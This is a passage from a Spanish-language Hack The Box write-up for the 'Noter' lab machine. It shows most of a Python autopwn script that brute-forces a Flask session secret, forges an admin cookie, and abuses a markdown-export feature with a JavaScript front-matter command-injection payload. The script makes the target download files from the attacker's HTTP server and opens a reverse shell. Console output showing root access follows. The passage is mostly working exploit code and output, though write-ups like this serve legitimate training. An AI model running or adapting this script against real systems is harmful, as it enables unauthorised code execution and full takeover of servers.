+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">"Secret key : {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">secret</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">secret</span>
+
+<span class="c1"># craft target cookie
+</span><span class="k">def</span> <span class="nf">create_cookie</span><span class="p">(</span><span class="n">secret_key</span><span class="p">):</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Creating new cookie with target payload'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">target_session_payload</span><span class="p">))</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="n">serializer</span> <span class="o">=</span>  <span class="n">URLSafeTimedSerializer</span><span class="p">(</span>
+                            <span class="n">secret_key</span><span class="o">=</span><span class="n">secret_key</span><span class="p">,</span> 
+                            <span class="n">salt</span><span class="o">=</span><span class="s">'cookie-session'</span><span class="p">,</span> 
+                            <span class="n">serializer</span><span class="o">=</span><span class="n">TaggedJSONSerializer</span><span class="p">(),</span> 
+                            <span class="n">signer</span><span class="o">=</span><span class="n">TimestampSigner</span><span class="p">,</span> 
+                            <span class="n">signer_kwargs</span><span class="o">=</span><span class="p">{</span>
+                                <span class="s">'key_derivation'</span><span class="p">:</span><span class="s">'hmac'</span><span class="p">,</span>
+                                <span class="s">'digest_method'</span><span class="p">:</span> <span class="n">hashlib</span><span class="p">.</span><span class="n">sha1</span>
+                                <span class="p">}</span>
+                            <span class="p">).</span><span class="n">dumps</span><span class="p">(</span><span class="n">target_session_payload</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="s">'Cookie : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">serializer</span><span class="p">))</span>
+        <span class="k">return</span> <span class="n">serializer</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">'{} ocurred'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+<span class="c1"># create malicious file
+</span><span class="k">def</span> <span class="nf">create_file</span><span class="p">(</span><span class="n">command</span><span class="p">):</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="nb">file</span><span class="p">:</span>
+            <span class="n">b64_command</span> <span class="o">=</span> <span class="s">'echo "{}" | /usr/bin/base64 -w 0'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">command</span><span class="p">)</span>
+            <span class="n">payload</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">run</span><span class="p">(</span><span class="n">b64_command</span><span class="p">,</span> <span class="n">capture_output</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">text</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span> <span class="n">shell</span><span class="o">=</span><span class="bp">True</span><span class="p">).</span><span class="n">stdout</span><span class="p">.</span><span class="n">strip</span><span class="p">(</span><span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
+            <span class="nb">file</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="s">"""---js</span><span class="se">\n\n\t</span><span class="s">((require("child_process")).execSync("echo {} | /usr/bin/base64 -d | /bin/bash"))</span><span class="se">\n\n</span><span class="s">---"""</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="k">print</span><span class="p">(</span><span class="n">e</span><span class="p">)</span>
+                                                                    
+<span class="c1"># get reverse shell
+</span><span class="k">def</span> <span class="nf">get_reverse_shell</span><span class="p">(</span><span class="n">target_cookie</span><span class="p">):</span>
+    <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">p</span> <span class="o">=</span> <span class="n">log</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">'Getting reverse shell'</span><span class="p">)</span>
+    <span class="n">p</span><span class="p">.</span><span class="n">status</span><span class="p">(</span><span class="s">'IP -&gt; {}, PORT -&gt; {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
+    <span class="k">try</span><span class="p">:</span>
+        <span class="c1"># web server to share pwned file
+</span>        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Openning port 8000 to share files: {}, {}, {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">file_name</span><span class="p">,</span> <span class="n">lib_name</span><span class="p">,</span> <span class="n">shell_name</span><span class="p">))</span>
+        <span class="n">command</span> <span class="o">=</span> <span class="s">'/usr/bin/python3 -m http.server 8000'</span>
+        <span class="n">p1</span> <span class="o">=</span> <span class="n">subprocess</span><span class="p">.</span><span class="n">Popen</span><span class="p">(</span><span class="n">shlex</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="n">command</span><span class="p">),</span> <span class="n">stdout</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">,</span> <span class="n">stderr</span><span class="o">=</span><span class="n">subprocess</span><span class="p">.</span><span class="n">DEVNULL</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+        <span class="c1"># web server to receive shell
+</span>        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Open the port {p} to receive the shell (e.g : nc -lvnp {p})'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">p</span><span class="o">=</span><span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
+        <span class="nb">input</span><span class="p">(</span><span class="s">'Press ENTER to continue'</span><span class="p">)</span>
+        <span class="n">time</span><span class="p">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+        <span class="c1"># upload pwned file
+</span>        <span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">'Uploading and executing malicious files'</span><span class="p">)</span>
+        <span class="c1"># create directory
+</span>        <span class="n">create_file</span><span class="p">(</span><span class="n">commands</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+        <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">Session</span><span class="p">()</span>
+        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">'Content-Type'</span><span class="p">:</span><span class="s">'application/x-www-form-urlencoded'</span><span class="p">}</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="s">'url=http://{}:8000/{}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">file_name</span><span class="p">)</span>
+        <span class="n">cookie</span> <span class="o">=</span> <span class="nb">dict</span><span class="p">(</span><span class="n">session</span><span class="o">=</span><span class="n">target_cookie</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm pwned.md"</span><span class="p">)</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/export_note_remote'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+        <span class="c1"># enter directory and download malicious library
+</span>        <span class="n">create_file</span><span class="p">(</span><span class="n">commands</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="mi">8000</span><span class="p">,</span> <span class="n">lib_name</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/export_note_remote'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm pwned.md"</span><span class="p">)</span>
+        <span class="c1"># enter directory and download shell code
+</span>        <span class="n">create_file</span><span class="p">(</span><span class="n">commands</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="nb">format</span><span class="p">(</span><span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="mi">8000</span><span class="p">,</span> <span class="n">shell_name</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/export_note_remote'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+        <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="s">"rm pwned.md"</span><span class="p">)</span>
+        <span class="c1"># execute shell code to receive shell like root
+</span>        <span class="n">create_file</span><span class="p">(</span><span class="n">commands</span><span class="p">[</span><span class="mi">2</span><span class="p">].</span><span class="nb">format</span><span class="p">(</span><span class="n">shell_name</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">ip</span><span class="p">,</span> <span class="n">args</span><span class="p">.</span><span class="n">port</span><span class="p">))</span>
+        <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">target_url</span><span class="si">}</span><span class="s">/export_note_remote'</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">headers</span><span class="p">,</span> <span class="n">cookies</span><span class="o">=</span><span class="n">cookie</span><span class="p">)</span>
+        <span class="c1"># kill subprocess
+</span>        <span class="n">p1</span><span class="p">.</span><span class="n">kill</span><span class="p">()</span>
+    <span class="k">except</span> <span class="nb">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+        <span class="n">p</span><span class="p">.</span><span class="n">failure</span><span class="p">(</span><span class="s">'{} ocurred'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">key</span> <span class="o">=</span> <span class="n">bruteforce_cookie</span><span class="p">(</span><span class="n">load_wordlist</span><span class="p">())</span>
+    <span class="n">target_cookie</span> <span class="o">=</span> <span class="n">create_cookie</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
+    <span class="n">get_reverse_shell</span><span class="p">(</span><span class="n">target_cookie</span><span class="p">)</span>
+    <span class="n">os</span><span class="p">.</span><span class="n">system</span><span class="p">(</span><span class="sa">f</span><span class="s">'rm </span><span class="si">{</span><span class="n">file_name</span><span class="si">}</span><span class="s">'</span><span class="p">)</span>
+
+<span class="c1"># References
+#---------------------------------------------------
+#https://github.com/Paradoxis/Flask-Unsign
+#https://github.com/Paradoxis/Flask-Unsign-Wordlist
+</span></pre></table></code></div></div><blockquote class="prompt-info"><div><p>Puede encontrar el script y archivos necesarios en mi repositorio <a href="https://github.com/E1P0TR0/CVE-Machines_htb/tree/main/Auto-tools_Noter/autopwnd">https://github.com/E1P0TR0</a></p></div></blockquote><p>Ahora solo lo ejecutamos, abrimos el puerto especificado para recibir la shell y conseguimos la flag:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+</pre><td class="rouge-code"><pre><span class="go">❯ python3 autopwned.py -ip 10.10.14.181 -port 1234
+</span><span class="gp">[+] Creating user: Username -&gt;</span><span class="w"> </span>Jnxzx , Password -&gt; Jnxzx
+<span class="go">[ ] Starting Brute-force attack: secret123
+[*] Payload : {'logged_in': True, 'username': 'Jnxzx'}
+[+] Secret key : secret123
+[q] Creating new cookie with target payload: {"logged_in": true, "username": "blue"}
+[+] Cookie : eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiYmx1ZSJ9.YtTLNQ.TRLb4J_17aC1S6X1caMAvGGV7vQ
+</span><span class="gp">[▖] Getting reverse shell: IP -&gt;</span><span class="w"> </span>10.10.14.181, PORT -&gt; 1234
+<span class="go">[*] Openning port 8000 to share files: pwned.md, lib_mysqludf_sys_64.so, pwned_mysqlUDF.py
+[*] Open the port 1234 to receive the shell (e.g : nc -lvnp 1234)
+Press ENTER to continue
+[*] Uploading and executing malicious files
+
+
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+❯ nc -lvnp 1234
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::1234
+Ncat: Listening on 0.0.0.0:1234
+Ncat: Connection from 10.10.11.160.
+Ncat: Connection from 10.10.11.160:59678.
+bash: cannot set terminal process group (967): Inappropriate ioctl for device
+bash: no job control in this shell
+</span><span class="gp">root@noter:/var/lib/mysql#</span><span class="w"> </span><span class="nb">whoami</span>
+<span class="go">whoami
+root
+</span><span class="gp">root@noter:/var/lib/mysql#</span><span class="w"> </span>find / <span class="nt">-name</span> root.txt | xargs <span class="nb">ls</span> <span class="nt">-l</span>
+<span class="go">find / -name root.txt | xargs ls -l
+-rw-r----- 1 root root 33 Jul 17 21:40 /root/root.txt
+</span></pre></table></code></div></div><hr /></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/htb/'>HTB</a>, <a href='/categories/writeups/'>Writeups</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/htb/" class="post-tag no-text-decoration" >HTB</a> <a href="/tags/linux/" class="post-tag no-text-decoration" >Linux</a> <a href="/tags/medium/" class="post-tag no-text-decoration" >Medium</a> <a href="/tags/python-scripting/" class="post-tag no-text-decoration" >Python Scripting</a> <a href="/tags/bash-scripting/" class="post-tag no-text-decoration" >Bash Scripting</a> <a href="/tags/flask/" class="post-tag no-text-decoration" >Flask</a> <a href="/tags/information-leakage/" class="post-tag no-text-decoration" >Information Leakage</a> <a href="/tags/cve-2021-23639/" class="post-tag no-text-decoration" >CVE-2021-23639</a> <a href="/tags/mysql/" class="post-tag no-text-decoration" >MySQL</a> <a href="/tags/backups/" class="post-tag no-text-decoration" >backups</a> <a href="/tags/user-validation/" class="post-tag no-text-decoration" >User validation</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hackthebox Writeup Noter - Marss&amp;url=https://e1p0tr0.github.io/posts/HTBNoter/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hackthebox Writeup Noter - Marss&amp;u=https://e1p0tr0.github.io/posts/HTBNoter/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https://e1p0tr0.github.io/posts/HTBNoter/&amp;text=Hackthebox Writeup Noter - Marss" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/HTBMeta/">Hackthebox Writeup Meta</a><li><a href="/posts/HTBPhotobomb/">Hackthebox Writeup Photobomb</a><li><a href="/posts/HTBZipping/">Zipping Report</a><li><a href="/posts/HTBJupiter/">Jupiter Report</a><li><a href="/posts/HTBSau/">Sau Notes</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="tail-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/HTBUndetected/"><div class="card-body"> <em class="timeago small" data-ts="1650704859" > 2022-04-23 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Undetected</h3><div class="text-muted small"><p> Máquina Linux donde enumeramos por TCP para hallar un subdominio que al aplicar Directory Fuzzing encontramos una ruta vulnerable del framework PHPUnit que nos permitía Remote Code Execution (RCE) ...</p></div></div></a></div><div class="card"> <a href="/posts/HTBShared/"><div class="card-body"> <em class="timeago small" data-ts="1660598471" > 2022-08-15 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Shared</h3><div class="text-muted small"><p> Overview: Database enumeration and SSH password leak by SQL Inyection Remote command execution in IPython (CVE-2022-21699) (Foothold) Redis password leak exploiting a connection binary Re...</p></div></div></a></div><div class="card"> <a href="/posts/HTBCarpediem/"><div class="card-body"> <em class="timeago small" data-ts="1662408792" > 2022-09-05 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hackthebox Writeup Carpediem</h3><div class="text-muted small"><p> Overview: Evade login to website by leaking SQL query Remote code execution by test function with full access (Container, python scripting) Network host scanning (bash scripting) Pivoting...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/HTBOpensource/" class="btn btn-outline-primary" prompt="Older"><p>Hackthebox Writeup Opensource</p></a> <a href="/posts/HTBFaculty/" class="btn btn-outline-primary" prompt="Newer"><p>Hackthebox Writeup Faculty</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center text-muted"><div class="footer-left"><p class="mb-0"> © 2023 <a href="https://twitter.com/username">Marsello Guillén</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/htb/">HTB</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/python-scripting/">Python Scripting</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/information-leakage/">Information Leakage</a> <a class="post-tag" href="/tags/hard/">Hard</a> <a class="post-tag" href="/tags/lfi/">LFI</a> <a class="post-tag" href="/tags/rce/">RCE</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
